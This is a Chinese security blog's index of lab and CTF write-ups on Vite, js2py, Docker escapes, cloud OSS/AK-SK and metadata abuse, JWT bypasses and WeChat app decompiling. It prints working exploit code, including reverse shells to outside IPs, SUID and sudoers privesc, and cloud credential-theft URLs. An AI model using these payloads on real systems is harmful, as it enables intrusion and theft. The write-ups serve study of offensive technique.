
[{"content":"","date":"26 August 2025","externalUrl":null,"permalink":"/","section":"IIIIIII的博客","summary":"","title":"IIIIIII的博客","type":"page"},{"content":" Pane12靶机-Vite-宝塔提权 # 这边直接进入8080端口打开vite\n启动后访问3000端口是一个宝塔的界面\n这里使用nuclei或者你搜索CVE搜索漏洞可以发现一个CVE-2025-31125\n192.168.1.208:3000/@fs/etc/passwd?import\u0026amp;?inline=1.wasm?init\nbase64解密\nhydra -l welcome -P /usr/share/john/password.lst ssh://192.168.1.208:22 -V -I -f -u -t 50 -e nsr 拿到一个用户爆破\n发现一个宝塔的程序可以先修改面板密码然后进入 进入后这里发现两个一个是直接打开终端\n还有写计划任务\n宝塔的计划任务目录在\n/www/server/cron/\n","date":"26 August 2025","externalUrl":null,"permalink":"/posts/pane12/","section":"Posts","summary":"","title":"Pane12靶机-VITE","type":"posts"},{"content":"","date":"26 August 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"26 August 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"26 August 2025","externalUrl":null,"permalink":"/tags/vite/","section":"Tags","summary":"","title":"Vite","type":"tags"},{"content":" CodeTwo靶机-HTB # 扫描发现了8000端口可以下载源码并执行JS命令\r下载分析这是一个flask框架使用js2py来执行JS代码并且使用的sqlite数据库方便快捷\rSQLite3 本身不提供密码保护机制，它只是一个单文件数据库，数据存储在 .db文件里（如 users.db）。\rjs2py的某个全局变量存在一个漏洞，攻击者可以使用这个漏洞在js代码中获得一个python对象的引用，使得攻击者可以逃逸js环境，在主机上执行任意命令。\rCVE-2024-28397\rlet cmd = \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.28/3333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;;\rlet hacked, bymarve, n11;\rlet getattr, obj;\rhacked = Object.getOwnPropertyNames({});\rbymarve = hacked.__getattribute__;\rn11 = bymarve(\u0026#34;__getattribute__\u0026#34;);\robj = n11(\u0026#34;__class__\u0026#34;).__base__;\rgetattr = obj.__getattribute__;\rfunction findpopen(o) {\rlet result;\rfor (let i in o.__subclasses__()) {\rlet item = o.__subclasses__()[i];\rif (item.__module__ == \u0026#34;subprocess\u0026#34; \u0026amp;\u0026amp; item.__name__ == \u0026#34;Popen\u0026#34;) {\rreturn item;\r}\rif (item.__name__ != \u0026#34;type\u0026#34; \u0026amp;\u0026amp; (result = findpopen(item))) {\rreturn result;\r}\r}\r}\rfindpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();\r\u0026#34;OK\u0026#34;; 反弹成功后sqlite一般在Instance下面我们使用sqlite3来查看数据库\nsqlite3 /home/app/instance/users.db\r.tables\rcode_snippet user SELECT * FROM user;\r1|marco|649c9d65a206a75f5abe509fe128bce5\r2|app|a97588c0e2fa3a024876339e27aeb42e\r3|123|202cb962ac59075b964b07152d234b70\rMD5 分析\r破解结果: sweetangelbabylove 登录上去发现可以使用npbackup-cli\rnpbackup-cli是一个基于 Restic 的备份工具\rRestic 是一个开源、跨平台的备份工具，专注于安全、高效和易用性。它采用加密存储，支持增量备份，并可以存储数据到多种后端（如本地磁盘、SFTP、AWS S3、MinIO 等）。\rmarco@codetwo:~$ cat \u0026gt; /tmp/exploit.sh \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39;\r\u0026gt; #!/bin/bash\r\u0026gt; # 设置SUID权限\r\u0026gt; chmod +s /bin/bash\r\u0026gt; # 或者直接添加sudo权限\r\u0026gt; echo \u0026#34;marco ALL=(ALL) NOPASSWD:ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\r\u0026gt; EOF\rsudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --external-backend-binary=/tmp/exploit.sh --backup\r--external-backend-binary=/tmp/exploit.sh→ 让npbackup执行你的脚本\r--backup /etc/passwd /tmp/→ 触发备份操作，使脚本被执行 ","date":"25 August 2025","externalUrl":null,"permalink":"/posts/codetwo/","section":"Posts","summary":"","title":"CodeTwo靶机-HTB","type":"posts"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker","type":"tags"},{"content":" Docker-逃逸-LINux内核漏洞 # 如何判断在不在docker环境 # 容器逃逸方法检测指北 | T Wiki\n1.cat /proc/1/cgroup | grep -qi docker \u0026amp;\u0026amp; echo \u0026#34;Is Docker\u0026#34; || echo \u0026#34;Not Docker\u0026#34; 2.检查/.dockerenv文件 3.检查mount信息 4.查看硬盘 fdisk -l 如果测试了特权不行，socket,挂载都没有，就测试docker漏洞，内核漏洞，翻数据库文件找和主目录有交集的文件 如果是JAVA应用你进去就是ROOT 就考虑逃逸 如果是WWW那么还要加一步提权到ROOT 再到逃逸 LINUX内核漏洞 CVE-2022-0492 # 影响版本: linux kernel 5.17-rc3\r漏洞危害: 当容器没有开启额外安全措施时，获得容器内root权限即可逃逸到宿主机\r下载POC解压创建一个有缺陷的DOCKER上传执行EXP\rdocker run --rm -it --cap-add=SYS_ADMIN --security-opt=\u0026#34;apparmor=unconfined\u0026#34; ubuntu:20.04 /bin/bash docker cp exp.sh 11e84a3b3d90:/ 复制上传 如果真实环境就下载wget啊什么的\rchmod 777 exp.sh\r./exp.sh \u0026#34;cat /etc/passwd\u0026#34; 内核漏洞-CVE-2022-0847 # 影响版本: 高于5.8的Linux内核版本会受到影响\r漏洞危害：攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权root\r复现环境：Ubuntu 16.04 X64\r参考：\rwiki.teamssix.com/CloudNative/Docker/CVE-2022-0847.html\r利用：github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git\rCVE-2022-0847-DirtyPipe-Exploits-main 上传里面三个文件编译执行\rdocker run -itd ubuntu:latest 启动镜像\rapt-get update更新\rapt-get install gcc 如果编译完上传上去可能有版本差异 生成文件来执行\nDocker远程 API未授权访问逃逸 # 当Docker守护进程被配置为监听网络端口（通常是TCP端口2375）且未启用适当的身份验证机制时，攻击者可以未经授权访问Docker API。利用此漏洞，攻击者可以在主机系统上创建、修改和执行容器，可能导致远程代码执行、数据窃取以及完全控制主机系统。\r通常端口是2375 原理通过未授权创建容器挂载后往计划任务写入反弹shell\r不同环境计划任务不同 不同系统可能反弹命令不同\r使用dockerRemoteApiGetRootShell攻击 项目如下 需要python2来运行\r反弹需要镜像名字但是这个靶场可能环境有问题 复现环境：http://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce\n利用项目：https://github.com/xiju2003/dockerRemoteApiGetRootShell-fix\n","date":"25 August 2025","externalUrl":null,"permalink":"/posts/docker3/","section":"Posts","summary":"","title":"Docker-逃逸-LINux内核漏洞","type":"posts"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":" Docker-逃逸-本身漏洞-CDK工具使用 # 如何判断在不在docker环境 # 容器逃逸方法检测指北 | T Wiki\n1.cat /proc/1/cgroup | grep -qi docker \u0026amp;\u0026amp; echo \u0026#34;Is Docker\u0026#34; || echo \u0026#34;Not Docker\u0026#34; 2.检查/.dockerenv文件 3.检查mount信息 4.查看硬盘 fdisk -l 如果测试了特权不行，socket,挂载都没有，就测试docker漏洞，内核漏洞，翻数据库文件找和主目录有交集的文件 如果是JAVA应用你进去就是ROOT 就考虑逃逸 如果是WWW那么还要加一步提权到ROOT 再到逃逸 本身漏洞CVE-2019-5736 runC容器逃逸 # Docker version \u0026lt;= 18.09.2\rRunC version \u0026lt;= 1.0-rc6\r条件如上\r需要go语言来编译POC 这个缺陷是需要管理员自己进入才能触发----\rsudo yum install golang\rCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go linux环境编译\rdocker run -itd --cap-add=SYS_ADMIN ubuntu:latest创建环境\rdocker cp main name:/ 上传镜像\rdocker exec -it name /bin/sh 触发反弹 https://github.com/Frichetten/CVE-2019-5736-PoC\n下载poc修改反弹代码\n上传文件执行\nNMAP扫描 模拟管理员登录\nNMAP扫描 自动反弹本机的文件ROOT到反弹的位置\nNMAP扫描 d\nCVE-2020-15257 containerd逃逸-工具CDK介绍 # containerd \u0026lt; 1.4.3\rcontainerd \u0026lt; 1.3.9\r我们使用工具来逃逸上传进去添加777权限\r普通检测./cdk_linux_amd64 evaluate ./cdk_linux_amd64 run shim-pwn reverse xx.xx.xx.xx xxxx 使用CVE-2020-15257\r如果检测到就使用 例如特权模式挂载命令 ./cdk run mount-disk socket挂载漏洞 ./cdk run docker-sock-pwn /var/run/docker.sock \u0026#34;touch /host/tmp/pwn-success\u0026#34; 命令执行\tUsage:\rcdk evaluate [--full]\rcdk run (--list | \u0026lt;exploit\u0026gt; [\u0026lt;args\u0026gt;...])\rcdk \u0026lt;tool\u0026gt; [\u0026lt;args\u0026gt;...]\rEvaluate:\rcdk evaluate Gather information to find weekness inside container.\rcdk evaluate --full Enable file scan during information gathering.\rExploit:\rcdk run --list List all available exploits.\rcdk run \u0026lt;exploit\u0026gt; [\u0026lt;args\u0026gt;...] Run single exploit, docs in https://github.com/Xyntax/CDK/wiki\rTool:\rvi \u0026lt;file\u0026gt; Edit files in container like \u0026#34;vi\u0026#34; command.\rps Show process information like \u0026#34;ps -ef\u0026#34; command.\rnc [options] Create TCP tunnel.\rifconfig Show network information.\rkcurl\t(get|post) \u0026lt;url\u0026gt; \u0026lt;data\u0026gt; Make request to K8s api-server.\rucurl (get|post) \u0026lt;socket\u0026gt; \u0026lt;uri\u0026gt; \u0026lt;data\u0026gt; Make request to docker unix socket.\rprobe \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; \u0026lt;parallel\u0026gt; \u0026lt;timeout-ms\u0026gt; TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000\rOptions:\r-h --help Show this help msg.\r-v --version Show version. https://github.com/cdk-team/CDK\nNMAP扫描 拿到主机权限\nNMAP扫描 ","date":"23 August 2025","externalUrl":null,"permalink":"/posts/docker2/","section":"Posts","summary":"","title":"Docker-逃逸-本身漏洞-CDK工具使用","type":"posts"},{"content":" Docker-逃逸-安全-挂载-特权 # 如何判断在不在docker环境 # 容器逃逸方法检测指北 | T Wiki\n1.cat /proc/1/cgroup | grep -qi docker \u0026amp;\u0026amp; echo \u0026#34;Is Docker\u0026#34; || echo \u0026#34;Not Docker\u0026#34; 2.检查/.dockerenv文件 3.检查mount信息 4.查看硬盘 fdisk -l 如果测试了特权不行，socket,挂载都没有，就测试docker漏洞，内核漏洞，翻数据库文件找和主目录有交集的文件 如果是JAVA应用你进去就是ROOT 就考虑逃逸 如果是WWW那么还要加一步提权到ROOT 再到逃逸 目录挂载如果有etc啊log就不确定能不能获得关键信息了 特权模式逃逸 # docker run --rm --privileged=true -it alpine 启动交互终端 名字叫alpine 停止就删除 并且 有特权模式的docker镜像 拿去后进入一个终端可以发现根目录下就有docker特征\u0026mdash;确定在docker里面了\nNMAP扫描 判断是否是特权模式 # cat /proc/self/status | grep CapEff 如果在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff 特权模式挂载逃逸 # 特权模式查看磁盘信息\n现在我们的test里面就是根目录信息\nfdisk -l mkdir /test \u0026amp;\u0026amp; mount /dev/sda1 /test 挂载了 真机的物理分区 /dev/sda1 到容器内的 /test 目录，实现了容器与真机之间的 文件系统共享 往test里面对应就是根目录写入的文件对应显示真机目录 NMAP扫描 下一步写入计划任务反弹SHELL\nDocker Socket 逃逸 # docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu 探测存不存在sock ls -lah /var/run/docker.sock 如果存在这个文件，说明漏洞可能存在 容器内部安docker客户端 docker exec -it with_docker_sock /bin/bash apt-get update apt-get install curl curl -fsSL https://get.docker.com/ | sh 安装失败就手动安装 apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin docker-ce-rootless-extras docker-buildx-plugin 执行docker命令逃逸 docker run -it -v /:/host ubuntu /bin/bash -v /:/host：将宿主机的根目录（/）挂载到容器内的 /host 目录对 /host 的操作会直接影响宿主机的文件系统 chroot /host 改变根目录 不是特权但是在docker环境并且发现sock文件\nNMAP扫描 挂载成功逃逸成功\nNMAP扫描 docker-procfs逃逸 # docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 启动docker find / -name core_pattern 检查是否存在漏洞 如果有两个就表示有 cat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir 检查工作目录绝对路径 安装gcc apt-get update -y \u0026amp;\u0026amp; apt-get install gcc -y 找到工作目录\nworkdir=/var/lib/docker/overlay2/61934ad893e443d362bd64e7d78111896fefcfaaed6b550f0a185d9745465676/work 0 0\nNMAP扫描 cat \u0026gt;/tmp/.x.py \u0026lt;\u0026lt; EOF\r#!/usr/bin/python\rimport os\rimport pty\rimport socket\rlhost = \u0026#34;116.62.32.64\u0026#34; lport = 5566\rdef main():\rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rs.connect((lhost, lport))\ros.dup2(s.fileno(), 0)\ros.dup2(s.fileno(), 1)\ros.dup2(s.fileno(), 2)\ros.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;)\rpty.spawn(\u0026#34;/bin/bash\u0026#34;)\ros.remove(\u0026#39;/tmp/.x.py\u0026#39;)\rs.close()\rif __name__ == \u0026#34;__main__\u0026#34;:\rmain()\rEOF\r设置好反弹的IP以及端口\rchmod 777 .x.py 给权限 NMAP扫描 echo -e \u0026#34;|/var/lib/docker/overlay2/61934ad893e443d362bd64e7d78111896fefcfaaed6b550f0a185d9745465676/merged/tmp/.x.py \\rcore \u0026#34; \u0026gt; /host/proc/sys/kernel/core_pattern 设置好挂载路径与工作路径对应\ncat \u0026gt;/tmp/x.c \u0026lt;\u0026lt; EOF\r#include \u0026lt;stdio.h\u0026gt;\rint main(void)\r{\rint *a = NULL;\r*a = 1;\rreturn 0;\r}\rEOF\rgcc x.c -o x 编译\r执行文件：\r./x nc -lvvp xxxx 反弹成功\nNMAP扫描 ","date":"18 August 2025","externalUrl":null,"permalink":"/posts/docker/","section":"Posts","summary":"","title":"Docker-逃逸-安全","type":"posts"},{"content":"","date":"14 August 2025","externalUrl":null,"permalink":"/tags/aksk/","section":"Tags","summary":"","title":"Aksk","type":"tags"},{"content":"","date":"14 August 2025","externalUrl":null,"permalink":"/tags/oss/","section":"Tags","summary":"","title":"Oss","type":"tags"},{"content":" 云上服务-OSS存储桶渗透-AKSK两种利用特征-ECS元数据横向移动 # OSS # OSS介绍 # 特别提示访问阿里云不要开启抓包可能会封号\n各个云厂商对云服务的叫法都不统一，这里统一以AWS为例。\rS3 对象存储Simple Storage Service，\r简单的说就是一个类似网盘的东西\rEC2 即弹性计算服务Elastic Compute Cloud，\r简单的说就是在云上的一台虚拟机。\rRDS 云数据库Relational Database Service，\r简单的说就是云上的一个数据库。\rIAM 身份和访问管理Identity and Access Management，\r简单的说就是云控制台上的一套身份管理服务，可以用来管理每个子账号的权限\r不同厂商对象存储名字不同\r#对象存储各大云名词：\r阿里云：OSS 腾讯云：COS 华为云：OBS\r谷歌云：GCS 微软云：Blob 亚马逊云：S3\r而且OSS可以\r创建OSS桶 # 购买服务后创建名字注意必须唯一\nNMAP扫描 可以看到自动我们域名变成了这个\nNMAP扫描 我们上传一个文件还访问不到需要临时凭证\nNMAP扫描 这时候我们修改ACL策略 先关闭这个\nNMAP扫描 公开读取-需要文件名 # 修改读写为公开读取\nNMAP扫描 原来不修改的话你访问是不会下载的\nameti14.oss-cn-beijing.aliyuncs.com/44.jpg\nNMAP扫描 修改后无需凭证即可下载\nNMAP扫描 公开上传-任意上传 # 如果你的权限是开启了公共读写-那么就可以发包上传了\nNMAP扫描 可以看到200了\nNMAP扫描 文件列表多出了文件\nNMAP扫描 或者开启策略\rossPutObject NMAP扫描 成功上传! NMAP扫描 .\nOSS-目录遍历 # 条件是\n1、公共读取-私有也可以\r2、Policy(listObject)\r-权限Bucket授权策略：设置ListObject显示完整结构\rOSSFileBrowse-1.0-SNAPSHOT-工具查看内容\r设置权限是list\nNMAP扫描 当你再次访问基本的域名即可遍历OSS全部内容-不用加文件名\nhttps://ameti14.oss-cn-beijing.aliyuncs.com/\nNMAP扫描 工具可以访问测试并且可以测试上传 仅限简单漏洞测试\nNMAP扫描 工具测试查看有无敏感泄露内容\nNMAP扫描 OSS-任意修改策略 # https://wiki.teamssix.com/CloudService/S3/bucket-policy-able-to-write.html\n设置了这个策略并且授权全部账号后攻击者可以任意修改你的策略来实现访问\nNMAP扫描 就是修改下面这个语法\nNMAP扫描 OSS-域名接管 # 原理如下：\r比如你的网站\rameti14.oss-cn-beijing.aliyuncs.com/ -\u0026gt; 绑定域名 ti14cham.sec.cloud 上去\r然后你没用了你把这个ameti14.oss-cn-beijing.aliyuncs.com桶删除了X 但是注意你的域名还在和你的桶绑定\r而你的桶因为释放了别人就可以创建同一地区，同一名字实现接管域名 当你访问那个域名后会泄露本身的如alixx地址所以你知道可以地区域名接管 NMAP扫描 AKSK泄露接管 # AKSK不同厂商特征\n怎么得到AKSK：\r1：JS泄露\r2：APP反编译泄露\r3：拿到shell了翻文件\r4：源码泄露\rAk/SK特征识别：\r亚马逊云 (Amazon Web Services, AWS)的开头标识一般是\u0026#34;AKIA\u0026#34;\rGoogle云 Cloud Platform (GCP)的 开头标识一般是 \u0026#34;GOOG\u0026#34;\rMicrosoft Azure 的 Access Key 开头标识一般是 \u0026#34;AZ\u0026#34;\rIBM 云 (IBM Cloud) 的 Access Key 开头标识一般是 \u0026#34;IBM\u0026#34;\rOracle云 (Oracle Cloud) 的 Access Key 开头标识一般是 \u0026#34;OCID\u0026#34;\r腾讯云 (Tencent Cloud)的Access Key开头标识一般是 \u0026#34;AKID\u0026#34;\r阿里云 (Alibaba Cloud)的Access Key开头标识一般是 \u0026#34;LTAI\u0026#34;\r华为云 (Huawei Cloud)的 Access Key是20个随机大写字母和数字组成\r百度云 (Baidu Cloud) 的 Access Key开头标识一般是 \u0026#34;AK\u0026#34;\r京东云 (JD Cloud)的Access Key开头标识一般是 \u0026#34;JDC_\u0026#34;\r联通云 (China Unicom Cloud)的Access Key开头标识一般是 \u0026#34;LTC\u0026#34;\r移动云 (China Mobile Cloud)的Access Key开头标识一般是 \u0026#34;YD\u0026#34;\r中国电信云 (China Telecom Cloud)的开头标识一般是 \u0026#34;CTC\u0026#34;\r参考：https://wiki.teamssix.com/CloudService/more/ Ram用户权限-AKSK # RAM账号就是分配用户给他们用户可以用这个来登录阿里云，而这个用户有相应的AK和SK，不同用户权限由用户分配\r通过RAM控制台创建用户会生成对应的AKSK NMAP扫描 生成后记得复制不然看不了\nNMAP扫描 这里账号密码可以用户ram登录 AKSK用户调用\rhttps://signin.aliyun.com RAM用户登录网址\r使用工具云资产管理工具图形化界面\rhttps://github.com/wgpsec/lc\rhttps://github.com/wgpsec/cloudsword\rhttps://github.com/dark-kingA/cloudTools\rhttps://github.com/iiiusky/alicloud-tools\r这里我们输入AKSK但是还是不行因为用户也是有授权的 NMAP扫描 当你给了这些全部权限后\nNMAP扫描 成功识别当前账号的ECS 你可以点击接管会自动创建一个RAM用户进行点击RAM登录上去账户\nNMAP扫描 NMAP扫描 所以AKSK是要看运气的看权限的不然也没啥用\n根据AKSK权限区分控制OSS或者账号全部资产\n下面是官方工具需要AKSK登录\nNMAP扫描 云账户下面的AKSK # 可以看到我们用户下面本来就有AKSK\r云账号的AKSK默认就是绑定云账户，云账号什么权限他就是什么权限不需要额外设置 一种ram是下面分支而云账号的AKSK是他的载体 NMAP扫描 NMAP扫描 生成后它不需要设置什么权限-只要你账户有OSS他就可以看有ECS他就可以看，并且可以生成RAM用户\nECS-元数据 # 元数据 # 实例元数据是指实例ID、VPC信息、网卡信息等实例属性信息，支持在ECS实例内部通过访问元数据服务（Metadata Service）获取。 通过该获取方式，您无需登录控制台或调用API，在实例内部即可访问实例信息，可以更便捷、安全地配置或管理正在运行的实例或实例上的程序。\n阿里云元数据地址：http://100.100.100.200/ 腾讯云元数据地址：http://metadata.tencentyun.com/ 华为云元数据地址：http://169.254.169.254/ 亚马云元数据地址：http://169.254.169.254/ 微软云元数据地址：http://169.254.169.254/ 谷歌云元数据地址：http://metadata.google.internal/\n1、前提条件：\r-弹性计算配置访问控制角色\r-SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发URL）\rRAM用户不同，RAM角色没有永久身份凭证（登录密码或访问密钥），需要被一个可信实体扮演 分配角色到ECS上面\r获取关键信息\rhttp://100.100.100.200/latest/meta-data/\rhttp://100.100.100.200/latest/meta-data/ram/security-credentials/ 获得用户\r获取临时凭证\rhttp://100.100.100.200/latest/meta-data/ram/security-credentials/xxxxxx 访问后获得AKSK以及TOKEN然后使用云管理工具连接\r利用条件：SSRF，或者得到SHELL\r所以条件下:横向移动\r1：你拿到权限里面是ROOT你可以直接访问对应有没有用户获得AKSK如果对方AKSK权限大进而扩大战果\r2：可以利用SSRF获得AKSK 基础利用 # 授予角色\nNMAP扫描 访问对应的元数据获得用户然后访问用户得到AKSK放入利用工具利用\nNMAP扫描 一旦收回就显示404了\nNMAP扫描 ","date":"14 August 2025","externalUrl":null,"permalink":"/posts/oss/","section":"Posts","summary":"","title":"云上服务-OSS存储桶渗透-AKSK两种利用特征","type":"posts"},{"content":"","date":"13 August 2025","externalUrl":null,"permalink":"/tags/jwt/","section":"Tags","summary":"","title":"Jwt","type":"tags"},{"content":" JWT渗透相关 # 介绍 # JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。\n分为三个部分组成\nHeader-payload-Signature(签名)\n工作流程：post提交表单后，后端验证完成生成一个jwt，接下来返回该jwt至客户端，随后请求中带上该jwt，即可工作。\n5、作为请求头可以跨域工作\n对比cookie-session\r1、JWT数据量小，传输速度快\r2、由于是json，JWT是跨语言的，应用广\r3、更适用于移动端，因为它们不支持cookie\r4、避免csrf，因为不依赖cookie\r头：\r{\r\u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;,\t#签名算法 HMAC SHA256\r\u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;\t#统一为JWT\r}\rpayload\r{\r\u0026#34;sub\u0026#34;: \u0026#34;1234567890\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;Helen\u0026#34;,\r\u0026#34;admin\u0026#34;: true\r}\rSignature（验证） 实验1-不验证签名 # Lab: JWT authentication bypass via unverified signature 不会验证签名 # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature\n实现修改用户为admin\nNMAP扫描 在你登录上去后产生JWT里面对应了你的用户名信息\n放入到工具扫描可以得到\nNMAP扫描 为了我们修改可以使用JWTTOOL -T 修改 或者使用BP插件修改\nNMAP扫描 NMAP扫描 看看生成的用户修改没\nNMAP扫描 我们访问/admin重新发包\neyJraWQiOiJkOTE3NDA3My1lMTcwLTQ4NDctOTAwMC04ZTcxMzY1Yjg1YmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NTA1NjQzMSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.pQxVLaYatgGTpT24U6fh5Le3WacEkOP5_x2KW-Rg6_sVClGmUfgq1CXxHfUjQyjSGnJBIuiSoAdBS7u0m9MMdgcEz-NNPtc6CPUOcDZ2_coG9IlMFRd1sC6QOvgBTglRC4vzVMySrixSEWGDyr9cXGFGR3WhFb38dtCRHKxSTPDTC33QeqvfCtYWDqkPoYzEJ4766II_3tEYB3sMHWlveWKPuiBq7P9jg-N2y3aaToNsM_rSg8733ev8BJtkoJzoPmXlE6dhoNvdwKALYZ0Gpa1r-TbjAY0cdREhjoSuhZWjp_RXok9ddex4DDZDZwjRoh-JebOvzIng_tIgIAbDbA NMAP扫描 成功进入管理员界面删除用户即可通过 删除也要覆盖JWT进行绕过因为他并没有验证签名\nNMAP扫描 实验2 对方验证不要签名的JWT # JWT authentication bypass via flawed signature verification # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification\n目的也是删除用户登录admin网页\n这个设置缺陷是对方接收未签名的JWT就是alg为none\n这里-H 可以看到可以输入 -X a 直接让JWT签名为空不用手动输入了\nNMAP扫描 NMAP扫描 我们来发包验证\nNMAP扫描 可以看到成功进入\neyJraWQiOiJmZWIyMjFkOS00MWI0LTQwNGEtOGUyZi1lNjU4Mzk5YjM0MDAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NTA1NzgxNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9. NMAP扫描 实验3 签名弱口令 # JWT authentication bypass via weak signing key # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key\n签名也是可以爆破的，如果你爆破出签名就可以随意利用前提是他的加密算法符合\n使用DudeSuite 工具爆破也可以使用john hashcat\n注意爆破要输入完整的JWT\n输入整个 JWT 可以确保爆破过程的完整性和准确性。有些情况下，JWT 的负载中可能包含一些与验证逻辑相关的信息（比如过期时间、用户角色等），虽然这些信息不是直接参与签名计算，但在某些场景下，它们会影响到签名验证的最终结果。通过使用完整的 JWT，工具可以模拟整个签名验证的过程，更准确地判断找到的密钥是否是正确的签名密钥 。\nNMAP扫描 拿到密钥是secret1\r可以直接到官网输入密钥修改了 但是前面两个实验是不可以直接修改的必须使用工具\rhttps://www.jwt.io/ NMAP扫描 发包验证成功删除即可通过\nNMAP扫描 ","date":"13 August 2025","externalUrl":null,"permalink":"/posts/jwt/","section":"Posts","summary":"","title":"JWT渗透相关","type":"posts"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/totp/","section":"Tags","summary":"","title":"TOTP","type":"tags"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/wechat/","section":"Tags","summary":"","title":"Wechat","type":"tags"},{"content":" Wechat渗透相关抓包反编译 # e0e1反编译工具 # 需要配置文件目录config.yaml里面\nwx-file: \u0026lsquo;C:\\Users\\user\\Documents\\WeChat Files\u0026rsquo; 配置你的目录\n自动收集接口这个工具更偏向信息收集\nNMAP扫描 生成对应的文件xlsx\nNMAP扫描 Wedecode反编译工具 # wedecode程序可以实现全面反编译对比e0e1但是e0e1是自动化实现 但是推荐两个一起用\nNMAP扫描 当你微信小程序访问点击一个进去后会生成一个文件夹\nwx开头的就可以使用工具进行反编译了这里注意微信版本太高好像不能反编译了没有wxapkg后缀了\nNMAP扫描 但是你放入进去它提示错误-先解密才行\nNMAP扫描 使用目录下的解密工具\nNMAP扫描 打开选中__APP__.wxapkg\nNMAP扫描 生成一个文件然后再去放到wedecode里面\nNMAP扫描 然后反编译\nNMAP扫描 NMAP扫描 微信小程序在线调试 # 这里要注意版本的\n任务管理器右键打开目录查看小程序版本\nNMAP扫描 JaveleyQAQ/WeChatOpenDevTools-Python: WeChatOpenDevTool 微信小程序强制开启开发者工具\nhttps://github.com/tom-snow/wechat-windows-versions/releases/download/v3.9.10.19/WeChatSetup-3.9.10.19.exe 推荐这个版本\nWechatOpenDevTools-Python.exe\n现在没有我们来开启它\n先关闭所以小程序\nNMAP扫描 NMAP扫描 NMAP扫描 BP抓包小程序 # Proxifier工具\nwechatappex.exe加到程序里面\nNMAP扫描 成功抓包\nNMAP扫描 # ","date":"8 August 2025","externalUrl":null,"permalink":"/posts/wechat/","section":"Posts","summary":"","title":"Wechat渗透相关抓包反编译","type":"posts"},{"content":"","date":"8 August 2025","externalUrl":null,"permalink":"/tags/wedocode/","section":"Tags","summary":"","title":"Wedocode","type":"tags"},{"content":" XuanJi靶机\u0026mdash;难度low知识点-Git,TOTP,so提权 # Nmap扫描发现端口开放 # 常规的端口\nNMAP扫描 结果是一个验证码令牌\nNMAP扫描 Dirsearch发现Git泄露用工具提取\nNMAP扫描 这个工具是PYTHON2\nNMAP扫描 git log -p找出不同点发现一个注释\nNMAP扫描 放在生成器网站base32 都可以\nTOTP 生成器\n在线OTP密码生成器\nNMAP扫描 拿到shell权限 # 反弹就行\nNMAP扫描 linpeas扫描发现有一个文件可写 AI说可以动态库提取提权\nNMAP扫描 拿root # 写一个C文件\nNMAP扫描 生成为动态库so文件\n-fPIC：生成位置无关代码（共享库必需）。 -shared：指定生成共享库。 NMAP扫描 输入后执行root他会调用然后获得root权限\n但是这里有问题再把情况返回试试\nNMAP扫描 NMAP扫描 可以执行命令\nNMAP扫描 总结一下 # ","date":"8 August 2025","externalUrl":null,"permalink":"/posts/xuanji/","section":"Posts","summary":"","title":"XuanJi靶机---难度low知识点-Git,TOTP","type":"posts"},{"content":" 红日靶场4\u0026mdash; # 一共三台主机 一台双网卡1公网和内网网段 还有两台一台DC 一台WIN7 内网网段为183\nGetshell # 发现公网开了3个奇怪端口我们访问\nNMAP扫描 2001端口getshell # 2001一看就是Struct2 直接工具getshell 第一个\u0026mdash;\u0026mdash;\u0026mdash;2001\nNMAP扫描 NMAP扫描 NMAP扫描 上传JSP哥斯拉getshell\nNMAP扫描 2002端口 # 没有管理界面\nNMAP扫描 https://www.exploit-db.com/exploits/42953 tomcat PUT CVE\rPUT 